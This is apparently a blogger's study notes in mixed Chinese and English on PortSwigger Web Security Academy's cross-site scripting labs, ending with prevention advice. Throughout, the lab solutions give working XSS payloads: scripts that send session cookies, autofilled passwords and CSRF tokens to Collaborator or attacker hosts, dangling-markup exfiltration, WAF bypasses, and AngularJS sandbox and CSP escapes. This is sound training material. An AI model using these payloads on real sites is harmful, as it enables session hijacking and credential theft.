---
layout: article
title: WSAcademy 10 -- XSS
mathjax: true
key: a00021
cover: /bkgs/1.png
modify_date: 2021-10-18
show_author_profile: true
excerpt_type: html
tag: 
- WSAcademy
- XSS
mode: immersive
header:
  theme: dark
article_header:
  type: overlay
  theme: dark
  background_color: '#203028'
  background_image:
    gradient: 'linear-gradient(135deg, rgba(34, 139, 87 , .4), rgba(139, 34, 139, .4))'
    src: /docs/assets/images/cover3.jpg
---

这篇是Web Security Academy的XSS部分<!--more-->

原文：[What is cross-site scripting (XSS) and how to prevent it?](https://portswigger.net/web-security/cross-site-scripting)

[XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

# What is cross-site scripting (XSS)?

Cross-site scripting (also known as XSS) is a web security vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application

# How does XSS work?

Cross-site scripting works by **manipulating a vulnerable web site** so that it **returns malicious JavaScript** to users

When the malicious code executes inside a victim's browser, the attacker can fully compromise their interaction with the application.

# What are the types of XSS attacks?

There are three main types of XSS attacks. These are:

- **Reflected XSS**, where the malicious script comes from the **current HTTP request**.
- **Stored XSS**, where the malicious script comes from the **website's database**.
- **DOM-based XSS**, where the vulnerability exists **in client-side code** rather than server-side code.

# Reflected XSS

simplest variety of XSS ， 

It arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way

the script can carry out any action, and retrieve any data, to which the user has access.

## Impact of reflected XSS attacks

If an attacker can control a script that is executed in the victim's browser, then they can typically fully compromise that user. Amongst other things, the attacker can:

- **Perform/View/Modify** any action within the application that the user can perform.
- **Initiate interactions** with other application users, including malicious attacks, that will appear to **originate from the initial victim user**.

攻击者可能会诱使受害用户发出由他们控制的请求，以发起反射的XSS攻击。

这些措施包括在攻击者控制的网站上放置链接，或在允许生成内容的其他网站上放置链接，或通过在电子邮件、tweet或其他消息中发送链接

攻击需要外部传递机制，这意味着反射的XSS的影响通常不如存储的XSS严重

## How to find and test for reflected XSS vulnerabilities

Testing for reflected XSS vulnerabilities manually involves the following steps:

- **Test every entry point** 

includeing http headers

- **Submit random alphanumeric values** 

The value should be designed to survive most input validation

A random alphanumeric value of around <font color="red">8 characters</font> is normally ideal

- **Determine the reflection context**

For each location within the response where the random value is reflected, determine its context. This might be in text between HTML tags, within a tag attribute which might be quoted, within a JavaScript string, etc.

- **Test a candidate payload**

An efficient way to work is to leave the original random value in the request and place the candidate **XSS payload before or after it**

- **Test alternative payloads**（这两区别是啥）

If the candidate XSS payload was modified by the application, or blocked altogether, then you will need to test alternative payloads and techniques

For more details, see [cross-site scripting contexts](https://portswigger.net/web-security/cross-site-scripting/contexts)

- **Test the attack in a browser**

Finally, if you succeed in finding a payload that appears to work within Burp Repeater, transfer the attack to a real browser

Often, it is best to execute some simple JavaScript like alert(document.domain) which will trigger a visible popup within the browser if the attack succeeds.

## Common questions about reflected cross-site scripting

- **difference between stored and reflected XSS** 

- - Reflected XSS arises when an application takes some input from an HTTP request and embeds that input into the **immediate response** in an unsafe way. 
  - With stored XSS, the application instead stores the input and embeds it into a **later response** in an unsafe way.

- **reflected XSS and self-XSS**

Self-XSS involves similar application behavior to regular reflected XSS, however it **cannot be triggered in normal ways** via a crafted URL or a cross-domain request.

相反，只有**受害者自己从浏览器提交XSS负载时才会触发该漏洞**。传递Self-XSS攻击通常涉及对受害者进行社会工程，将攻击者提供的输入粘贴到其浏览器中。因此，它通常被认为是一个蹩脚、低影响的问题。

# Stored XSS

Stored cross-site scripting (also known as **second-order or persistent XSS**) arises when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way.

## Impact of stored XSS attacks

If an attacker can control a script that is executed in the victim's browser, then they can typically fully compromise that user. The attacker can carry out any of the actions that are applicable to the impact of reflected XSS vulnerabilities.

key difference between reflected and stored XSS is that a stored XSS vulnerability enables attacks that are **self-contained within the application itself**

## How to find and test for stored XSS vulnerabilities

Entry points into the application's processing include:

- URL查询字符串和消息正文中的参数或其他数据。

- URL文件路径。

- 与反射XSS相关的HTTP请求头可能不可利用

- 攻击者可以通过任何带外路由将数据传送到应用程序中

测试存储的XSS漏洞的第一步是定位**入口点和出口点之间的链接**

提交到入口点的数据从出口点发出

这可能具有挑战性的原因是：

- 提交到任何入口点的数据原则上可以从任何出口点发出

- 由于在应用程序中执行的其他操作，当前存储的数据通常容易被覆盖

更现实的方法是通过数据输入点系统地工作，向每个输入点提交一个特定值，并监控应用程序的响应，以检测提交值出现的情况。

当您在应用程序的处理过程中识别出入口点和出口点之间的链接时，需要对每个链接进行专门测试，以检测是否存在存储的XSS漏洞

确定上下文并测试合适的候选XSS有效负载。此时，测试方法与查找反映的XSS漏洞大致相同。

# Exploiting xss vulnerabilities

You might notice some people using **alert(document.domain)**. This is a way of making it explicit which domain the JavaScript is executing on.

## Exploiting by steal cookies

Stealing cookies is a traditional way to exploit XSS

可以把cookie放到自己浏览器冒充用户

significant limitations:

- victim might not be logged in.

- Many applications hide their cookies from JavaScript using the **HttpOnly** flag.（如果cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息）
- 会话可能会锁定到其他因素，如用户的IP地址
- session过期

lab：

```html
<script>
fetch('https://rxs3zmqnjibjkkjw988q1z1s9jfa3z.burpcollaborator.net',{
method:'POST',
body:document.cookie        
});
</script>

reminds:
https://xxx',{
```

（cookie不用包裹‘’）

或者，您可以通过 [exploiting the XSS to perform CSRF](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf)来调整攻击，使受害者在博客评论中发布他们的会话cookie。然而会公开了cookie和攻击的证据。

## Exploiting cross-site scripting to capture passwords

These days, many users have password managers that auto-fill their passwords. 

You can take advantage of this by **creating a password input**, **reading out the auto-filled password**, and sending it to your own domain

The primary disadvantage of this technique is that it only works on users who have a password manager that performs password auto-fill

lab:

```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

## Exploiting cross-site scripting to perform [CSRF](https://portswigger.net/web-security/csrf)

This type of exploit is typically referred to as [cross-site request forgery](https://portswigger.net/web-security/csrf) (CSRF), which is slightly confusing because CSRF can also occur as a standalone vulnerability. 

当CSRF作为独立漏洞出现时，可以使用**anti-CSRF**令牌等策略对其进行修补。但是，**如果存在XSS漏洞，则anti-CSRF令牌不提供任何保护**。

```html
lab：
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

- **XMLHttpRequest.open()** 方法初始化一个请求。该方法要从JavaScript代码使用

  xhrReq.open(method, url, async（true）, user（null）, password（null）);

  async 是否异步执行操作

  默认为true。如果值为false，send()方法直到收到答复前不会返回

- XMLHttpRequest.send(body) 方法用于发送 HTTP 请求。如果是异步请求（默认为异步请求），则此方法会在请求发送后立即返回；如果是同步请求，则此方法直到响应到达后才会返回

- *XMLHttpRequest*.onload = *callback*; 请求成功完成时触发。

# Cross-site scripting contexts

When testing for [reflected](https://portswigger.net/web-security/cross-site-scripting/reflected) and [stored](https://portswigger.net/web-security/cross-site-scripting/stored) [XSS](https://portswigger.net/web-security/cross-site-scripting), a key task is to identify the XSS context:

- The location 
- Identify the input validation 

## XSS between HTML tags

当XSS上下文是HTML标记之间的文本时，需要引入一些新的HTML标记来触发JavaScript的执行。

like:

```html
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>
```

```html
lab3：
test for tags <§§>
then events<{tested-tag}%20=1>

payload：
<iframe src="https://your-lab-id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=alert(document.cookie)%3E" onload=this.style.width='100px'>

lab4:
<script>
location='https://aca41f051f857f6380272f4d005d00ef.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>

original
<script>
location='https://aca41f051f857f6380272f4d005d00ef.web-security-academy.net/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
</script>
##此注入创建一个ID为x的自定义标记，其中包含一个触发警报函数的onfocus事件处理程序。加载页面后，URL末尾的hash(#)会立即focuses on this element，从而调用警报负载。
    
lab5：
search=<svg><a><animate attributeName=href values=javascript:alert(1) /><text>Click me</text></a>
```

| %3c           | <                                                            |
| ------------- | ------------------------------------------------------------ |
| %3e           | >                                                            |
| %3D           | =                                                            |
| %28           | (                                                            |
| %29           | )                                                            |
| attributeName | 这个属性指定在动画期间父元素中将要改变的属性的名称。 （在svg下面） |

## XSS in HTML tag attributes

能闭合的话

```html
for example：
" autofocus onfocus=alert(document.domain) x="
"><script>alert(document.domain)</script>
"onmouseover="alert(1)
```

or use **accesskey** attribute，

允许您定义一个字母，当与其他键组合按下时（这些键在不同平台上有所不同），将引发事件。在下一个lab中可以试验access keys并利用规范标记。

```html
lab：
https://your-lab-id.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
```

To trigger the exploit on yourself, press one of the following key combinations:

- On Windows: ALT+SHIFT+X
- On MacOS: CTRL+ALT+X
- On Linux: Alt+X

## XSS into JavaScript

当XSS上下文是响应中的一些现有JavaScript时，可能会出现各种各样的情况，需要使用不同的技术来执行成功的攻击。

### Terminating the existing script

```HTML
<script>
...
var input = 'controllable data here';
...
</script>
```

then you can use the following payload to break out of the existing JavaScript and execute your own:

```html
</script><img src=1 onerror=alert(document.domain)>
```

### Breaking out of a JavaScript string

Some useful ways of breaking out of a string literal are:

```
'-alert(document.domain)-'
';alert(document.domain)//
' ;alert(1)//
\';alert(1)//
```

WAF solution：

**throw** statement with an exception handler

这使您能够在不使用括号的情况下向函数传递参数。下面的代码将alert（）函数分配给全局异常处理程序，throw语句将1传递给异常处理程序（在本例中为alert）。最终结果是使用1作为参数调用alert（）函数。

```html
onerror=alert;throw 1
```

```html
lab
????
Visit the following URL, replacing your-lab-id with your lab ID:
https://your-lab-id.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
The lab will be solved, but the alert will only be called if you click "Back to blog" at the bottom of the page.
(https://your-lab-id.web-security-academy.net/post?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:')
该漏洞利用异常处理调用带有参数的警报函数。使用throw语句，用空白注释分隔，以绕过无空格限制。警报功能分配给OnError异常处理程序。
由于throw是一个语句，因此不能用作表达式。相反，我们需要使用arrow函数来创建一个块，以便可以使用throw语句。然后我们需要调用这个函数，所以我们将它分配给window的toString属性，并通过强制window上的字符串转换来触发它。
```

### Making use of HTML-encoding

当XSS上下文是引用的标记属性中的一些现有JavaScript（如事件处理程序）时，可以使用HTML编码来绕过一些输入过滤器。

如果服务器端应用程序阻止或清除利用XSS所需的某些字符，则通常可以通过对这些字符进行HTML编码来绕过输入验证。

For example, if the XSS context is as follows:

```html
<a href="#" onclick="... var input='controllable data here'; ...">
```

and the application blocks or escapes single quote characters, you can use the following payload to break out of the JavaScript string and execute your own script:

```html
&apos;-alert(document.domain)-&apos;
```

`&apos;`是表示撇号或单引号的HTML实体。因为浏览器HTML在解释JavaScript之前解码onclick属性的值，所以实体被解码为引号，成为字符串分隔符，因此攻击成功

```html
lab ： 在xss代码前后加上-

&apos;-alert(document.domain)-&apos;
http://foo?&apos;-alert(1)-&apos;
```

### XSS in JavaScript template literals

JavaScript模板文本是允许嵌入JavaScript表达式的字符串文本。嵌入的表达式将被计算并通常连接到周围的文本中。模板文本被封装在反勾号`中而不是普通的引号中，嵌入的表达式使用${…}语法进行标识。

```html
like：
document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;
```

For example, if the XSS context is as follows:

```html
<script>
...
var input = `controllable data here`;
...
</script>
```

then you can use the following payload to execute JavaScript without terminating the template literal:

```html
${alert(document.domain)}
```

## XSS in the context of the AngularJS sandbox

AngularJS沙盒是一种防止访问潜在危险对象（如窗口或文档）的机制,它还阻止访问潜在的危险属性，例如_proto__，且最终在**1.6**版本中从AngularJS中**删除**。

### How does the AngularJS sandbox work?

沙盒的工作原理是解析表达式，重写JavaScript，然后使用各种函数测试重写的代码是否包含任何危险对象

例如，`ensureSafeObject()`函数检查给定**对象是否引用自身**

`ensureSafeMemberName()`函数的作用是：检查对象的每个属性访问，如果对象包含危险的属性，如`__proto__`或`__lookupGetter__`，则对象将被阻止

`ensureSafeFunction()`函数的作用是防止调用`call(),apply(),bind(),constructor()`

### How does an AngularJS sandbox escape work?

?(似乎有些疑问)

The most well-known escape uses the modified `charAt()` function globally within an expression:

```javascript
'a'.constructor.prototype.charAt=[].join
```

用 `[].join` 方法重写函数，这会导致`charAt()`函数返回发送给它的所有字符

### Constructing an advanced AngularJS sandbox escape

例如：

不使用单引号或双引号创建字符串。

在标准的沙盒转义中常使用$eval()执行JavaScript负载，但在下面的lab中，$eval())函数未定义。幸运的是，我们可以使用orderBy过滤器。orderBy筛选器的典型语法如下所示：

```javascript
[123]|orderBy:'Some string'
```

```javascript
lab：
https://ac8f1f6e1f6f952b80912433008c0059.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

该漏洞使用toString（）创建字符串而不使用引号。然后它获取字符串原型并覆盖每个字符串的charAt函数。这有效地打破了AngularJS沙盒。接下来，一个数组被传递给orderBy过滤器。然后，通过再次使用toString（）创建字符串和字符串构造函数属性来设置筛选器的参数。最后，我们使用fromCharCode方法通过将字符代码转换为字符串x=alert（1）来生成有效负载。由于charAt函数已被覆盖，AngularJS将在通常不允许的情况下允许此代码。

### How does an AngularJS CSP bypass work?

Content security policy（CSP,内容安全策略）以类似于标准沙盒转义的方式绕过工作，但通常涉及一些HTML注入

当CSP模式在AngularJS开启时。 Function constructor is avoided



在事件内部时，AngularJS定义一个特殊的$event对象，该对象仅引用browser事件对象。您可以使用此对象执行CSP绕过



在Chrome上，$event/event对象上有一个名为path的特殊属性。此属性包含导致执行事件的对象数组。最后一个属性始终是window对象，我们可以使用它执行沙盒转义。通过将此数组传递给orderBy筛选器，我们可以枚举该数组并使用最后一个元素（window对象）执行全局函数，如alert（）。下面的代码演示了这一点：

```javascript
<input autofocus ng-focus="$event.path|orderBy:'[].constructor.from([1],alert)'">
```

Using the from() function instead effectively hides the window object from the sandbox, allowing us to inject malicious code.

#### Bypassing a CSP with an AngularJS sandbox escape

长度限制需要考虑从AngularJS沙盒隐藏窗口对象的各种方法，一种方法是使用array.map（）函数，如下所示：

```javascript
[1].map(alert)
```

map（）接受一个函数作为参数，并为数组中的每个项调用它。这将绕过沙箱，因为对alert（）函数的引用没有显式引用窗口

```javascript
lab：
<script>
location='https://your-lab-id.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>

location='https://your-lab-id.web-security-academy.net/?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x';
```

ng-AngularJS中的focus事件以创建绕过CSP的focus事件

$event，它是引用事件对象的AngularJS变量

path属性特定于Chrome，包含触发事件的元素数组

数组中的最后一个元素包含窗口对象。

通常，|在JavaScript中是一个bitwise or operation，但在AngularJS中它表示一个过滤器操作，在本例中是orderBy过滤器。冒号表示发送到筛选器的参数。在参数中，我们没有直接调用alert函数，而是将其指定给变量z。仅当orderBy操作到达$event.path数组中的窗口对象时，才会调用该函数。这意味着可以在窗口范围内调用它，而无需显式引用窗口对象，从而有效地绕过AngularJS的窗口检查。

### How to prevent AngularJS injection

To prevent AngularJS injection attacks, avoid using untrusted user input to generate templates or expressions.

# DOM-based XSS

基于DOM的XSS漏洞通常在JavaScript**从攻击者可控制的源（如URL**）获取数据并将其传递到支持动态代码执行的接收器（如eval()或innerHTML）时出现

要在HTML接收器中测试DOM XSS，请将一个随机字母数字字符串放入源代码（例如location.search），然后使用开发人员工具检查HTML并找到字符串的显示位置

`document.write`接收器与`script`元素一起工作，因此可以使用一个简单的payload，例如：

```javascript
document.write('... <script>alert(document.domain)</script> ...');
```

`innerHTML`接收器不接受任何现代浏览器上的`script`元素，`svg onload`事件也不会触发。这意味着您需要使用替代元素，如`img或iframe`。`onload`和`onerror`等事件处理程序可以与这些元素结合使用。例如：

```javascript
element.innerHTML='... <img src=1 onerror=alert(document.domain)> ...'
```

```
lab3：
<img src=1 onerror=alert(1)>
```

**if** **jQuery used**：

 the `attr()` function in jQuery can change attributes on DOM elements

**if** [**AngularJS**](https://portswigger.net/web-security/cross-site-scripting/contexts/angularjs-sandbox) **is used**：

可以在**没有尖括号或事件**的情况下执行JavaScript。

当站点在HTML元素上使用`ng-app`属性时，AngularJS将对其进行处理。在本例中，AngularJS将在双大括号内执行JavaScript，这些大括号可以直接出现在HTML或属性内。

AngularJS是一个流行的JavaScript库，它扫描包含`ng-app`属性（也称为AngularJS指令）的HTML节点的内容。将指令添加到HTML代码中时，可以在**双大括号{{}}**内执行JavaScript表达式。当尖括号被编码时，此技术非常有用

```javascript
lab：
{{$on.constructor('alert(1)')()}}
```

## DOM XSS combined with reflected and stored data

一些纯粹基于DOM的漏洞在单个页面中是自包含的。如果脚本从URL读取一些数据并将其写入危险接收器，则该漏洞完全是客户端侧的。

在反射+DOM漏洞中，服务器处理来自请求的数据，并将数据回显到响应中。反射的数据可能被放置到JavaScript字符串文本中，或者DOM中的数据项中，例如表单字段。然后，页面上的脚本以不安全的方式处理反映的数据，最终将其写入危险的接收器。

```javascript
eval('var data = "reflected string"');
```

- Reflected DOM XSS lab：

  ```javascript
  \"+alert(1)}//
  \"-alert(1)}//
  ```

  在调用alert（）函数之前，将使用算术运算符（在本例中为减法运算符）分隔表达式

  最后，一个结束的花括号和两个前斜杠提前关闭JSON对象，并注释掉该对象的其余部分

  As a result, the response is generated as follows:

  ```javascript
  {"searchTerm":"\\"-alert(1)}//", "results":[]}
  ```

- Stored DOM XSS lab 

  稍后响应中的脚本包含一个接收器，该接收器随后以不安全的方式处理数据。

  ```javascript
  element.innerHTML = comment.author
  
  lab：
  <><img src=1 onerror=alert(1)>
  ```

  为了防止XSS，网站使用JavaScript replace（）函数对尖括号进行编码。但是，当第一个参数是字符串时，该函数**仅替换第一次出现的**

## Which sinks can lead to DOM-XSS vulnerabilities?

The following are some of the main sinks that can lead to DOM-XSS vulnerabilities:

```javascript
document.write()
document.writeln()
document.domain
someDOMElement.innerHTML
someDOMElement.outerHTML
someDOMElement.insertAdjacentHTML
someDOMElement.onevent
```

The following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities:

```javascript
add()
after()
append()
animate()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()
```

## How to prevent DOM-XSS vulnerabilities

In addition to the general measures described on the [DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based) page, you should avoid allowing data from any untrusted source to be dynamically written to the HTML document.

# Content security policy

CSP是一种浏览器安全机制，旨在缓解[XSS](https://portswigger.net/web-security/cross-site-scripting)以及其他一些攻击

它通过限制

- 页面可以**加载**的资源（如脚本和图像）

- 一个页面可以被其他页面**嵌套**。


要启用CSP，响应需要包含一个名为Content Security Policy的HTTP响应头，其值包含该策略。策略本身由一个或多个指令组成，用分号（;）分隔。

## Mitigating XSS attacks using CSP

The following directive will only allow scripts to be loaded from the [same origin](https://portswigger.net/web-security/cors/same-origin-policy) as the page itself:

```javascript
script-src 'self'
```

The following directive will only allow scripts to be loaded from a specific domain:

```javascript
script-src https://scripts.normal-website.com
```

除了将特定域列入白名单之外，内容安全策略还提供了另外两种指定受信任资源的方法：nonce和hash：

- 指定一个nonce（随机值），并且在加载脚本的标记中必须使用相同的值

- 指定受信任脚本内容的哈希


CSP通常会阻止脚本之类的资源。但是，许多CSP**allow image requests**。这意味着可以经常使用`img`元素向外部服务器发出请求，例如以公开[CSRF令牌](https://portswigger.net/web-security/csrf/tokens)

```javascript
lab1：
<script>
location='https://your-lab-id.web-security-academy.net/my-account?email=%22%3E%3Ctable%20background=%27//your-collaborator-id.burpcollaborator.net?';
</script>

<script>
location='https://your-lab-id.web-security-academy.net/my-account?email="><table background='//your-collaborator-id.burpcollaborator.net?';
</script>

get csrf value first

then use burp to generate CSRF POC 
Engagement tools -> Generate CSRF PoC ->Options ->Include auto-submit script -> Regenerate ->Copy HTML -> Deliver exploit to victim

POC自动提交
<script>
    document.forms[0].submit();
</script>
```

有些策略限制性更强，可以阻止所有形式的外部请求。然而，仍然可以通过引发一些用户交互来绕过这些限制。要绕过这种形式的策略，您需要注入一个HTML元素，单击该元素时，该元素将存储注入元素中包含的所有内容，并将其发送到外部服务器。

```javascript
lab2：
<script>
if(window.name) {
new Image().src='//6qxrdc148ae8clypvz0qsxqin9t5hu.burpcollaborator.net?'+encodeURIComponent(window.name);
} else {
location = 'https://acd31fbd1e290c25800710d2005000d4.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://ac8e1fe11e1b0c568004101a0175005b.web-security-academy.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
}
</script>
```

## Mitigating dangling markup attacks using CSP

The following directive will only allow images to be loaded from the same origin as the page itself:

`img-src 'self'`

The following directive will only allow images to be loaded from a specific domain:

`img-src https://images.normal-website.com`

## Bypassing CSP with policy injection

可能会遇到一个将输入反映到实际策略中的网站，最有可能是在`ReportURI`指令中。你可以注入`;`指示

Chrome最近引入了script-src-elem指令，允许控制script元素，但不能控制事件。至关重要的是，这个新指令允许覆盖现有的 script-src指令

```javascript
lab3:
https://your-lab-id.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27

https://your-lab-id.web-security-academy.net/?search=<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
```

注入使用CSP中的脚本script-src-elem指令。此指令允许您仅针对脚本元素。使用此指令，您可以覆盖现有的script-src规则，使您能够注入不安全的 unsafe-inline，从而允许您使用内联脚本。

## Protecting against [clickjacking](https://portswigger.net/web-security/clickjacking) using CSP

The following directive will only allow the page to be framed by other pages from the same origin:

`frame-ancestors 'self'`

The following directive will prevent framing altogether:

`frame-ancestors 'none'`

Using content security policy to prevent clickjacking is more flexible than using the X-Frame-Options header because you can specify multiple domains and use wildcards. For example:

frame-ancestors 'self' https://normal-website.com https://*.robust-website.com

CSP还验证父帧层次结构中的每个frame，而`X-frame-Options`仅验证顶级frame。

建议使用CSP防止点击劫持攻击。您还可以将其与`X-Frame-Options`头相结合，在不支持CSP的旧浏览器（如Internet Explorer）上提供保护。

# Dangling markup injection

Dangling markup注入是一种在不可能进行完整的跨站点脚本攻击的情况下跨域捕获数据的技术。

假设应用程序以不安全的方式将攻击者可控制的数据嵌入其响应中：

```html
<input type="text" name="input" value="CONTROLLABLE DATA HERE
```

payload ：

```html
"><img src='//attacker-website.com?
```

此负载创建一个`img`标记，并定义包含攻击者服务器上URL的`src`属性的开始。

请注意payload**没有闭合**src属性，该属性处于“Dangling (悬空)”状态

在该字符之前的所有内容都将被视为URL的一部分，并将在URL查询字符串中发送到攻击者的服务器

## How to prevent dangling markup attacks

可以和防xss的相同, by encoding data on output and validating input on arrival.

或者用 [content security policy](https://portswigger.net/web-security/cross-site-scripting/content-security-policy) ([CSP](https://portswigger.net/web-security/cross-site-scripting/content-security-policy)). 例如使用防止诸如img之类的标记加载外部资源的策略来防止某些（但不是全部）攻击。

# How to prevent XSS attacks

In general, effectively preventing XSS vulnerabilities is likely to involve a combination of the following measures:

- **Encode data on output.**

在将用户可控制的数据写入页面之前，应直接应用编码

- - **In an HTML context** you should convert non-whitelisted values into HTML entities:

    ```
    < to &lt;
    > to &gt;
    ```

  - **In a JavaScript string context** , non-alphanumeric values should be Unicode-escaped:

    ```
    < to \u003c
    > to \u003e
    ```

  - first Unicode-escape the input, and then HTML-encode it would be better

- **Validate input on arrival**

- - 如果用户提交将在响应中返回的URL，则验证它是否以安全协议（如HTTP和HTTPS）开始。否则，有人可能会利用javascript或数据等有害协议攻击站点。

  - 如果用户提供了预期为数字的值，则验证该值是否实际包含整数.
  - 验证输入是否仅包含预期的字符集.

**and always use whitelist ！**

- **Use appropriate response headers.**

要防止HTTP响应中不包含任何HTML或JavaScript的XSS，可以使用`Content-Type`和`X-Content-Type-Options`头来确保浏览器以您想要的方式解释响应.

- **Content Security Policy.** 

As a last line of defense, you can use Content Security Policy (CSP) to reduce the severity of any XSS vulnerabilities that still occur.

example：

- default-src  'self'; script-src 'self'; object-src 'none'; frame-src 'none'; base-uri 'none';
- use **hash-** or **nonce-based** policy to allow scripts on different domains

#  Common questions about XSS

- **What is the difference between XSS and CSRF?** 

  XSS involves causing a web site to return malicious JavaScript, while CSRF involves inducing a victim user to perform actions they do not intend to do.

- **How do I prevent XSS in PHP?** 

- - Filter your inputs with a **whitelist** of allowed characters 
  - 使用类型提示或类型转换。.
  - Escape your outputs with `htmlentities` and `ENT_QUOTES` for      HTML contexts, or **JavaScript Unicode escapes** for JavaScript contexts.

- **How do I prevent XSS in Java?** 

- - Filter your  inputs with a **whitelist** of allowed characters
  - use a library such as **Google Guava** to HTML-encode your output for HTML contexts
  - use  **JavaScript Unicode escapes** for JavaScript contexts.